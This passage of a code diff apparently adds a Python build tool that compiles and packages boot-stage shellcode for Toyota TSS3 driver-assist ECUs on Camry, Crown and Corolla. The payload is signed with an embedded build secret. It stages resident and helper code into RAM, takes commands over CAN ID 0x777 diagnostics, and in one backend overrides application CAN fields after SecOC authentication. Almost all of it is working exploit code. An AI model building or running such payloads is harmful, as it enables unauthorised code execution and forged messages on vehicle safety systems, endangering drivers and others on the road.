+    for name, spec in TARGETS.items():
+        image = Path(spec["image"]).read_bytes()
+        images[name] = image
+        matrix_targets[name] = _verify_target(name, spec, image)
+        transit_proofs[name] = _verify_globalram_transit(name, spec, image)
+    # Re-run the stronger exact Corolla startup-survival proof on both retained
+    # H/F calibrations; they share one runtime profile in the universal payload.
+    h_survival = verify_corolla_startup_survival(images["corolla-8965H1202000"])
+    f_survival = verify_corolla_startup_survival(images["corolla-8965F1208000"])
+    if h_survival != f_survival:
+        raise RuntimeError("Corolla H/F startup-survival profile drift")
+
+    with tempfile.TemporaryDirectory(prefix="tss3-universal-") as td:
+        work = Path(td)
+        toolchain = validate_toolchain(work / "toolchain")
+        profiles: dict[str, dict] = {}
+        for profile, target in PROFILE_TARGETS.items():
+            profiles[profile] = _compile_profile(profile, TARGETS[target], work)
+            stem = _profile_file_stem(profile)
+            (work / f"{stem}_resident.bin").write_bytes(profiles[profile]["resident_blob"])
+            (work / f"{stem}_helper.bin").write_bytes(profiles[profile]["helper_blob"])
+
+        cursor = UNIVERSAL_PROFILE_DATA_OFFSET
+        layout: dict[str, dict] = {}
+        for profile in ("camry-f33", "crown-f30", "corolla-hf"):
+            cursor = _align(cursor, 4)
+            resident_offset = cursor
+            cursor += len(profiles[profile]["resident_blob"])
+            cursor = _align(cursor, 4)
+            helper_offset = cursor
+            cursor += len(profiles[profile]["helper_blob"])
+            layout[profile] = {"resident_offset": resident_offset, "helper_offset": helper_offset}
+        if cursor > UNIVERSAL_STAGING_LIMIT:
+            raise RuntimeError(f"universal profile data exceeds authenticated shellcode budget: 0x{cursor:X}")
+
+        stage_source = _universal_staging_source(profiles, layout)
+        (work / "universal_staging.S").write_text(stage_source, encoding="utf-8")
+        stage = compile_asm(work=work, source="universal_staging.S", stem="universal_staging",
+        vma=UNIVERSAL_STAGING_BASE, symbols=UNIVERSAL_BOOT_SYMBOLS, source_in_repo=False,)
+        stage_blob = stage["blob"]
+        assert isinstance(stage_blob, bytes)
+        if stage["relocations"]:
+            raise RuntimeError("universal staging retains relocations")
+        expected_boot_calls = [*F3_BOOT_SYMBOLS.values(), *COROLLA_BOOT_SYMBOLS.values()]
+        actual_boot_calls = jarl_targets(str(stage["disasm"]))
+        if actual_boot_calls[:len(expected_boot_calls)] != expected_boot_calls:
+            raise RuntimeError(
+                f"universal boot dispatch call prefix drift: {actual_boot_calls[:len(expected_boot_calls)]}"
+            )
+        if not (
+            stage_source.index(".L_boot_f3:") < stage_source.index("f3_boot_init_0")
+            < stage_source.index("f3_boot_validity_check") < stage_source.index(".L_identify_f3:")
+            and stage_source.index(".L_boot_corolla:") < stage_source.index("corolla_boot_init_0")
+            < stage_source.index("corolla_boot_validity_check") < stage_source.index(".L_identify_corolla:")
+        ):
+            raise RuntimeError("universal boot-family init/identity ordering drift")
+        if len(stage_blob) > UNIVERSAL_STAGING_LIMIT:
+            raise RuntimeError(f"universal staging exceeds authenticated shellcode budget: {len(stage_blob)}")
+        require_ram_code_publication(str(stage["disasm"]), 6, "universal RAM copies")
+        for profile, row in layout.items():
+            resident_blob = profiles[profile]["resident_blob"]
+            helper_blob = profiles[profile]["helper_blob"]
+            if stage_blob[row["resident_offset"]:row["resident_offset"] + len(resident_blob)] != resident_blob:
+                raise RuntimeError(f"{profile} universal resident embedding drift")
+            if stage_blob[row["helper_offset"]:row["helper_offset"] + len(helper_blob)] != helper_blob:
+                raise RuntimeError(f"{profile} universal helper embedding drift")
+
+        payload = package_shellcode(stage_blob, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
+        out.mkdir(parents=True, exist_ok=True)
+        stage_path = out / "tss3_universal_b6_signer.bin"
+        payload_path = out / "tss3_universal_b6_signer_payload.bin"
+        stage_path.write_bytes(stage_blob)
+        payload_path.write_bytes(payload)
+        profile_meta: dict[str, dict] = {}
+        for profile, row in layout.items():
+            stem = _profile_file_stem(profile)
+            resident_path = out / f"tss3_universal_{stem}_resident.bin"
+            helper_path = out / f"tss3_universal_{stem}_helper.bin"
+            resident_path.write_bytes(profiles[profile]["resident_blob"])
+            helper_path.write_bytes(profiles[profile]["helper_blob"])
+            profile_meta[profile] = {
+                "runtime_identity": PROFILE_RUNTIME_IDENTITIES[profile],
+                "resident_path": resident_path.name,
+                "resident_offset": row["resident_offset"],
+                "resident_size": len(profiles[profile]["resident_blob"]),
+                "resident_sha256": sha_bytes(profiles[profile]["resident_blob"]),
+                "helper_path": helper_path.name,
+                "helper_offset": row["helper_offset"],
+                "helper_size": len(profiles[profile]["helper_blob"]),
+                "helper_sha256": sha_bytes(profiles[profile]["helper_blob"]),
+                "foreground_entry": profiles[profile]["foreground_entry"],
+            }
+        common = {
+            "schema": "tss3-universal-b6-signer-payload-v1",
+            "staging": {
+                "path": stage_path.name, "base": f"0x{UNIVERSAL_STAGING_BASE:08X}",
+                "size": len(stage_blob), "limit": UNIVERSAL_STAGING_LIMIT,
+                "sha256": sha_bytes(stage_blob), "relocations": stage["relocations"],
+            },
+            "payload": {"path": payload_path.name, "size": len(payload), "sha256": sha_bytes(payload)},
+            "dispatcher": {
+                "boot_family_probe_address": f"0x{BOOT_FAMILY_PROBE_ADDR:08X}",
+                "boot_family_signatures": {key: f"0x{value:08X}" for key, value in BOOT_FAMILY_SIGNATURES.items()},
+                "identity_address": f"0x{APPLICATION_IDENTITY_ADDR:08X}",
+                "profiles": {profile: PROFILE_RUNTIME_IDENTITIES[profile] for profile in PROFILE_TARGETS},
+                "ordering": "low boot-family signature -> exact family boot init/validity -> application identity",
+                "unknown_identity": "fail-closed infinite loop before application startup",
+            },
+            "helper_transit": {
+                "base": f"0x{UNIVERSAL_HELPER_TRANSIT_BASE:08X}",
+                "limit": UNIVERSAL_HELPER_TRANSIT_LIMIT,
+                "lifetime": "boot payload to profile resident helper installation only",
+                "exact_image_pointer_literal_count": 0,
+                "mpu": transit_proofs,
+            },
+            "profiles": profile_meta,
+            "toolchain": toolchain,
+            "matrix_targets": matrix_targets,
+            "corolla_startup_survival": h_survival,
+        }
+        (out / "tss3_universal_b6_signer.json").write_text(json.dumps(common, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+        return common
+
+
+def build_exact_target_payload(name: str, out: Path) -> dict:
+    if name not in TARGETS:
+        raise RuntimeError(f"unsupported exact-target TSS3 target {name}")
+    spec = TARGETS[name]
+    image = Path(spec["image"]).read_bytes()
+    matrix_target = _verify_target(name, spec, image)
+    corolla_survival = verify_corolla_startup_survival(image) if spec["family"] == "corolla-hf" else None
+
+    with tempfile.TemporaryDirectory(prefix=f"tss3-field-{name}-") as td:
+        work = Path(td)
+        toolchain = validate_toolchain(work / "toolchain")
+
+        field_helper_source = Path(spec.get("field_helper_source", spec["helper_source"]))
+        field_helper_symbols = spec.get("field_helper_symbols", spec["helper_symbols"])
+        field_helper_macros = spec.get("field_helper_macros", spec["helper_macros"])
+        helper = _compile(
+            name, work, field_helper_source, "field_helper", spec["helper_base"],
+            field_helper_symbols, field_helper_macros,
+        )
+        helper_blob = helper["blob"]
+        assert isinstance(helper_blob, bytes)
+        if len(helper_blob) > spec["helper_limit"]:
+            raise RuntimeError(f"{name} field helper too large: {len(helper_blob)}")
+        if spec.get("field_runtime_backend") == "postauth-raw-com":
+            expected_helper_calls = [0x000988C2, 0x00069E7C, 0x00058B5E, 0x00066512]
+            actual_helper_calls = jarl_targets(str(helper["disasm"]))
+            if actual_helper_calls != expected_helper_calls:
+                raise RuntimeError(
+                    f"{name} post-auth helper call order drift: {actual_helper_calls} != {expected_helper_calls}"
+                )
+            if any(target in actual_helper_calls for target in CAMRY_HELPER_SYMBOLS.values()):
+                raise RuntimeError(f"{name} post-auth helper unexpectedly retains command-5 signer calls")
+
+        if spec["state_model"] == "split-telemetry":
+            # F33/F30: preserve the live-qualified high-tail install and move the
+            # helper only after application startup over the stock functional
+            # 0x777 mailbox. No boot-context GlobalRAM write occurs.
+            loader_macros = {
+                "TSS3_DCM_TAG_OFF": spec["helper_macros"]["TSS3_DCM_TAG_OFF"],
+                "TSS3_DCM_INDEX_OFF": spec["helper_macros"]["TSS3_DCM_SEQ_OFF"],
+                "TSS3_DCM_WORD_OFF": spec["helper_macros"]["TSS3_DCM_TARGET_OFF"],
+            }
+            field_resident_macros = {**loader_macros, **spec.get("field_resident_macros", {})}
+            resident = _compile(
+                name, work, FIELD_RESIDENT_SOURCE, "field_resident", spec["resident_base"],
+                spec["resident_symbols"], field_resident_macros,
+            )
+            resident_blob = resident["blob"]
+            assert isinstance(resident_blob, bytes)
+            if len(resident_blob) > spec["resident_limit"]:
+                raise RuntimeError(f"{name} field resident too large: {len(resident_blob)}")
+            require_ram_code_publication(
+                str(resident["disasm"]), 1, f"{name} C6 helper publication"
+            )
+            if len(helper_blob) > SPLIT_HELPER_WORDS * 4:
+                raise RuntimeError(f"{name} field helper exceeds C6 transfer image")
+            helper_image = helper_blob + b"\0" * (SPLIT_HELPER_WORDS * 4 - len(helper_blob))
+            (work / "resident.bin").write_bytes(resident_blob)
+            (work / "staging.S").write_text(f3_staging_source(len(resident_blob)), encoding="utf-8")
+            stage = compile_asm(work=work, source="staging.S", stem="field_staging",
+            vma=F3_STAGING_BASE, symbols=F3_BOOT_SYMBOLS, source_in_repo=False,)
+            stage_blob = stage["blob"]
+            assert isinstance(stage_blob, bytes)
+            if len(stage_blob) > F3_STAGING_LIMIT:
+                raise RuntimeError(f"{name} field staging too large")
+            if stage_blob[F3_STAGING_RESIDENT_OFFSET:F3_STAGING_RESIDENT_OFFSET + len(resident_blob)] != resident_blob:
+                raise RuntimeError(f"{name} field resident embedding drift")
+            require_ram_code_publication(str(stage["disasm"]), 1, f"{name} resident copy")
+            strategy = "split-functional-loader"
+            helper_transfer = {
+                "strategy": "functional-c6-after-startup",
+                "word_count": SPLIT_HELPER_WORDS,
+                "padded_size": len(helper_image),
+                "host_loader": True,
+                "boot_context_globalram_write": False,
+            }
+            foreground_entry = None
+            stage_limit = F3_STAGING_LIMIT
+        else:
+            # Corolla H/F: preserve the pre-one-shot field shape; helper bytes are
+            # embedded in the authenticated LocalRAM payload and copied into the
+            # startup-surviving low pocket before application startup.
+            resident_symbols = {**spec["resident_symbols"], "helper_size": len(helper_blob)}
+            field_resident_macros = {"TSS3_COROLLA_HF": 1}
+            resident = _compile(
+                name, work, FIELD_RESIDENT_SOURCE, "field_resident", spec["resident_base"],
+                resident_symbols, field_resident_macros,
+            )
+            resident_blob = resident["blob"]
+            assert isinstance(resident_blob, bytes)
+            if len(resident_blob) > spec["resident_limit"]:
+                raise RuntimeError(f"{name} field resident too large: {len(resident_blob)}")
+            require_ram_code_publication(
+                str(resident["disasm"]), 1, f"{name} embedded helper publication"
+            )
+            helper_image = helper_blob
+            foreground_entry = nm_symbol(str(resident["nm"]), "foreground_entry")
+            if foreground_entry is None:
+                raise RuntimeError(f"{name} field foreground entry missing")
+            (work / "resident.bin").write_bytes(resident_blob)
+            (work / "helper.bin").write_bytes(helper_blob)
+            (work / "staging.S").write_text(
+                corolla_staging_source(len(resident_blob), len(helper_blob)), encoding="utf-8"
+            )
+            stage = compile_asm(work=work, source="staging.S", stem="field_staging",
+            vma=COROLLA_STAGING_BASE, symbols=COROLLA_BOOT_SYMBOLS, source_in_repo=False,)
+            stage_blob = stage["blob"]
+            assert isinstance(stage_blob, bytes)
+            if len(stage_blob) > COROLLA_STAGING_LIMIT:
+                raise RuntimeError(f"{name} field staging too large")
+            if stage_blob[COROLLA_STAGING_RESIDENT_OFFSET:COROLLA_STAGING_RESIDENT_OFFSET + len(resident_blob)] != resident_blob:
+                raise RuntimeError(f"{name} field resident embedding drift")
+            if stage_blob[COROLLA_STAGING_HELPER_OFFSET:COROLLA_STAGING_HELPER_OFFSET + len(helper_blob)] != helper_blob:
+                raise RuntimeError(f"{name} field helper embedding drift")
+            require_ram_code_publication(str(stage["disasm"]), 1, f"{name} resident copy")
+            strategy = "embedded-helper-functional-control"
+            helper_transfer = {
+                "strategy": "embedded-before-application-startup",
+                "word_count": None,
+                "padded_size": len(helper_blob),
+                "host_loader": False,
+                "boot_context_globalram_write": False,
+            }
+            stage_limit = COROLLA_STAGING_LIMIT
+
+        expected_calls = list(TARGET_BOOT_SYMBOLS[spec["boot_family"]].values())
+        actual_calls = jarl_targets(str(stage["disasm"]))
+        if actual_calls[:len(expected_calls)] != expected_calls:
+            raise RuntimeError(f"{name} field boot call order drift: {actual_calls[:len(expected_calls)]}")
+        payload = package_shellcode(stage_blob, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
+
+        out.mkdir(parents=True, exist_ok=True)
+        stem = _profile_file_stem(spec["profile"])
+        stage_path = out / "tss3_field_b6_signer.bin"
+        payload_path = out / "tss3_field_b6_signer_payload.bin"
+        resident_path = out / f"tss3_field_{stem}_resident.bin"
+        helper_path = out / f"tss3_field_{stem}_helper.bin"
+        helper_image_path = out / f"tss3_field_{stem}_helper_image.bin"
+        stage_path.write_bytes(stage_blob)
+        payload_path.write_bytes(payload)
+        resident_path.write_bytes(resident_blob)
+        helper_path.write_bytes(helper_blob)
+        helper_image_path.write_bytes(helper_image)
+        profile_meta = {
+            "runtime_identity": PROFILE_RUNTIME_IDENTITIES[spec["profile"]],
+            "resident_path": resident_path.name,
+            "resident_size": len(resident_blob),
+            "resident_sha256": sha_bytes(resident_blob),
+            "helper_path": helper_path.name,
+            "helper_size": len(helper_blob),
+            "helper_sha256": sha_bytes(helper_blob),
+            "helper_image_path": helper_image_path.name,
+            "helper_image_size": len(helper_image),
+            "helper_image_sha256": sha_bytes(helper_image),
+            "foreground_entry": foreground_entry,
+            "resident_macros": field_resident_macros,
+            "helper_source": str(field_helper_source.relative_to(REPO)),
+            "helper_source_sha256": sha_file(field_helper_source),
+            "runtime_backend": spec.get("field_runtime_backend", spec.get("runtime_backend", "command5-presecoc")),
+        }
+        envelope = {
+            "schema": "tss3-exact-target-b6-signer-payload-v2",
+            "install_strategy": strategy,
+            "runtime_backend": spec.get("field_runtime_backend", spec.get("runtime_backend", "command5-presecoc")),
+            "staging": {
+                "path": stage_path.name, "base": f"0x{UNIVERSAL_STAGING_BASE:08X}",
+                "size": len(stage_blob), "limit": stage_limit,
+                "sha256": sha_bytes(stage_blob), "relocations": stage["relocations"],
+            },
+            "payload": {"path": payload_path.name, "size": len(payload), "sha256": sha_bytes(payload)},
+            "dispatcher": {
+                "mode": "host-exact-f181-bound",
+                "target": name,
+                "application_f181_hex": APP_F181[spec["software_id"]],
+                "boot_family": spec["boot_family"],
+                "boot_calls": [f"0x{x:08X}" for x in expected_calls],
+                "codeflash_data_reads_before_resident": False,
+                "boot_context_globalram_write": False,
+            },
+            "helper_transfer": helper_transfer,
+            "profiles": {spec["profile"]: profile_meta},
+            "toolchain": toolchain,
+            "matrix_targets": {name: matrix_target},
+            "corolla_startup_survival": corolla_survival,
+        }
+        (out / "tss3_exact_target_b6_signer.json").write_text(
+            json.dumps(envelope, indent=2, sort_keys=True) + "\n", encoding="utf-8"
+        )
+        return envelope
+
+
+def _write_target_metadata(name: str, out: Path, universal: dict) -> dict:
+    if name not in TARGETS:
+        raise RuntimeError(f"unsupported unified TSS3 target {name}")
+    spec = TARGETS[name]
+    matrix_target = universal["matrix_targets"][name]
+    profile = universal["profiles"][spec["profile"]]
+    resident_blob = (out / profile["resident_path"]).read_bytes()
+    helper_blob = (out / profile["helper_path"]).read_bytes()
+    helper_image_path = profile.get("helper_image_path", profile["helper_path"])
+    helper_image_blob = (out / helper_image_path).read_bytes()
+    payload = (out / universal["payload"]["path"]).read_bytes()
+    stage_blob = (out / universal["staging"]["path"]).read_bytes()
+    install_strategy = universal.get("install_strategy", UNIVERSAL_STRATEGY)
+
+    if spec["state_model"] == "split-telemetry":
+        transfer = (universal["helper_transfer"] if install_strategy == "split-functional-loader" else {
+            "strategy": "universal-globalram-at-foreground-count-224",
+            "transit_base": f"0x{UNIVERSAL_HELPER_TRANSIT_BASE:08X}",
+            "host_loader": False,
+        })
+        profile_layout = {
+            "state": {"base": f"0x{SPLIT_STATE_BASE:08X}", "size": SPLIT_STATE_SIZE, "magic": f"0x{SPLIT_STATE_MAGIC:08X}"},
+            "telemetry": {"base": f"0x{SPLIT_TELEMETRY_BASE:08X}", "size": SPLIT_TELEMETRY_SIZE},
+            "helper_transfer": transfer,
+        }
+        if profile.get("runtime_backend") == "postauth-raw-com":
+            profile_layout["postauth_override"] = {
+                "raw_com_base": "0xFEBE4BFF",
+                "route_generation": "0xFEBE5364",
+                "mutated_application_bytes": ["B3", "B4", "B5", "B6.bit2", "B8", "B9"],
+                "preserved_native_fields": ["B7 application sequence", "B28..B31 SecOC trailer", "freshness state"],
+                "hook_order": ["native SecOC/route44 publication", "raw-COM override", "application unpack/snapshot"],
+            }
+    else:
+        foreground_entry = profile["foreground_entry"]
+        if foreground_entry is None:
+            raise RuntimeError("Corolla foreground entry missing")
+        transfer = (universal["helper_transfer"] if install_strategy == "embedded-helper-functional-control" else {
+            "strategy": "universal-globalram-before-application-startup",
+            "transit_base": f"0x{UNIVERSAL_HELPER_TRANSIT_BASE:08X}",
+            "host_loader": False,
+        })
+        profile_layout = {
+            "state": {"base": "0xFEBFF9F0", "size": 24, "magic": "0x53463642"},
+            "telemetry": None,
+            "helper_transfer": transfer,
+            "foreground_entry": f"0x{foreground_entry:08X}",
+            "startup_survival": universal["corolla_startup_survival"],
+        }
+
+    prefix = name.replace("-", "_") + "_unified_b6_signer"
+    meta_path = out / f"{prefix}.json"
+    functional = matrix_target["functional_diagnostic_ingress"]
+    payload_descriptor_key = "universal_payload" if install_strategy == UNIVERSAL_STRATEGY else "exact_target_payload"
+    runtime_backend = profile.get("runtime_backend", spec.get("runtime_backend", "command5-presecoc"))
+    if runtime_backend == "postauth-raw-com" and install_strategy == "split-functional-loader":
+        review_status = "firmware-closed-live-proven-bootstrap-postauth-override-pending-live"
+    else:
+        review_status = {
+            UNIVERSAL_STRATEGY: "firmware-closed-live-failed-self-dispatch-experimental",
+            "split-functional-loader": "firmware-closed-live-proven-bootstrap-split-loader-pending-current-helper",
+            "embedded-helper-functional-control": "firmware-closed-live-unqualified-embedded-helper",
+        }.get(install_strategy, "firmware-closed-live-unqualified-exact-target")
+    descriptor = {
+        "path": universal["payload"]["path"], "sha256": universal["payload"]["sha256"],
+        "staging_path": universal["staging"]["path"], "staging_sha256": universal["staging"]["sha256"],
+        "staging_size": universal["staging"]["size"],
+        "dispatcher": universal["dispatcher"],
+    }
+    if "helper_transit" in universal:
+        descriptor["helper_transit"] = universal["helper_transit"]
+    if "helper_transfer" in universal:
+        descriptor["helper_transfer"] = universal["helper_transfer"]
+
+    meta = {
+        "schema": "tss3-unified-b6-signer-build-v1",
+        "review_status": review_status,
+        "target": {
+            "name": name, "family": spec["family"], "software_id": spec["software_id"],
+            "application_f181_hex": APP_F181[spec["software_id"]], "boot_f181_hex": BOOT_F181_HEX,
+            "codeflash_sha256": spec["sha256"], "universal_profile": spec["profile"],
+        },
+        "control": {
+            "can_id": "0x777", "bus": CONTROL_BUS, "extended": False,
+            "transport": "stock functional UDS / ISO-TP single frame",
+            "dcm_buffer": functional["functional_dcm_buffer"],
+            "loader_frame": LEGACY_LOADER_WIRE if install_strategy == "split-functional-loader" else None,
+            "runtime_frame": RUNTIME_WIRE,
+            "runtime_mode": spec["runtime_mode"], "host_loss_ticks": spec["host_loss_ticks"],
+            "release_sequence_zero": True,
+            "sequence_policy": "changed nonzero generations only; zero is neutral/release",
+            "functional_service_ids": functional["functional_service_ids"],
+            "c6_configured": False, "c7_configured": False,
+            "unsupported_service_nrc": "0x11", "functional_nrc11_suppressed": True,
+            "canfd_auto": False,
+        },
+        "install_strategy": install_strategy,
+        "runtime_backend": runtime_backend,
+        "state_model": spec["state_model"],
+        payload_descriptor_key: descriptor,
+        "resident": {
+            "base": f"0x{spec['resident_base']:08X}", "size": len(resident_blob), "limit": spec["resident_limit"],
+            "headroom": spec["resident_limit"] - len(resident_blob), "sha256": sha_bytes(resident_blob), "relocations": 0,
+        },
+        "helper": {
+            "base": f"0x{spec['helper_base']:08X}", "size": len(helper_blob), "limit": spec["helper_limit"],
+            "headroom": spec["helper_limit"] - len(helper_blob), "image_size": len(helper_image_blob),
+            "sha256": sha_bytes(helper_blob), "image_sha256": sha_bytes(helper_image_blob), "relocations": 0,
+        },
+        "layout": profile_layout,
+        "b6": {
+            "queue_record": f"0x{spec['b6_queue']:08X}", "secured_buffer": f"0x{spec['b6_buffer']:08X}",
+            "authenticated_sync": f"0x{spec['auth_sync']:08X}", "committed_freshness": f"0x{spec['b6_committed']:08X}",
+            "mutation": (
+                "post-auth route44 raw-COM B3..B9 application fields; native B6/SecOC bytes untouched"
+                if runtime_backend == "postauth-raw-com" else spec["mutation"]
+            ),
+        },
+        "mutation_boundary": {
+            "firmware_patch": False, "persistent_flash_write": False, "resident_can_transmit": False,
+            "secoc_result_override": False,
+            "native_mac_oracle_required": runtime_backend != "postauth-raw-com",
+            "command5_runtime_required": runtime_backend != "postauth-raw-com",
+            "native_secoc_bytes_mutated": runtime_backend != "postauth-raw-com",
+            "postauth_raw_com_override": runtime_backend == "postauth-raw-com",
+        },
+        "artifacts": {
+            "resident": profile["resident_path"], "helper": profile["helper_path"], "helper_image": helper_image_path,
+            "staging": universal["staging"]["path"], "payload": universal["payload"]["path"],
+        },
+        "artifacts_sha256": {
+            "resident": sha_bytes(resident_blob), "helper": sha_bytes(helper_blob), "helper_image": sha_bytes(helper_image_blob),
+            "staging": sha_bytes(stage_blob), "payload": sha_bytes(payload),
+        },
+        "compile_macros": {"resident": profile.get("resident_macros", spec["resident_macros"]),
+                           "helper": spec.get("field_helper_macros", spec["helper_macros"]) if install_strategy != UNIVERSAL_STRATEGY else spec["helper_macros"]},
+        "sources": {
+            "resident": {"path": str((FIELD_RESIDENT_SOURCE if install_strategy != UNIVERSAL_STRATEGY else Path(spec["resident_source"])).relative_to(REPO)),
+                         "sha256": sha_file(FIELD_RESIDENT_SOURCE if install_strategy != UNIVERSAL_STRATEGY else Path(spec["resident_source"]))},
+            "helper": {"path": profile.get("helper_source", str(Path(spec["helper_source"]).relative_to(REPO))),
+                       "sha256": profile.get("helper_source_sha256", sha_file(Path(spec["helper_source"])))},
+            "builder": {"path": str(BUILDER.relative_to(REPO)), "sha256": sha_file(BUILDER)},
+            "ingress_matrix": {"path": str(MATRIX.relative_to(REPO)), "sha256": sha_file(MATRIX)},
+        },
+        "toolchain": universal["toolchain"],
+    }
+    meta_path.write_text(json.dumps(meta, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+    return meta
+
+
+def build_target(name: str, out: Path, *, bootstrap: str = "universal") -> dict:
+    envelope = (
+        build_universal(out)
+        if bootstrap == "universal"
+        else build_exact_target_payload(name, out)
+    )
+    return _write_target_metadata(name, out, envelope)
+
+
+def build_all(out: Path) -> dict:
+    universal = build_universal(out)
+    targets = {name: _write_target_metadata(name, out, universal) for name in TARGETS}
+    return {
+        "schema": "tss3-universal-b6-signer-build-set-v1",
+        "universal": universal,
+        "targets": targets,
+    }
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument("--target", choices=("all", *TARGETS), default="all")
+    ap.add_argument("--bootstrap", choices=("universal", "exact-target"), default="universal")
+    
+    ap.add_argument("--output-dir", type=Path, default=DEFAULT_OUTPUT)
+    args = ap.parse_args()
+    
+    try:
+        if args.target == "all":
+            if args.bootstrap != "universal":
+                ap.error("--target all requires --bootstrap universal")
+            meta = build_all(args.output_dir)
+        else:
+            meta = build_target(args.target, args.output_dir, bootstrap=args.bootstrap)
+    except (OSError, RuntimeError, ValueError, subprocess.CalledProcessError, json.JSONDecodeError) as exc:
+        ap.error(str(exc))
+    print(json.dumps(meta, indent=2, sort_keys=True))
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
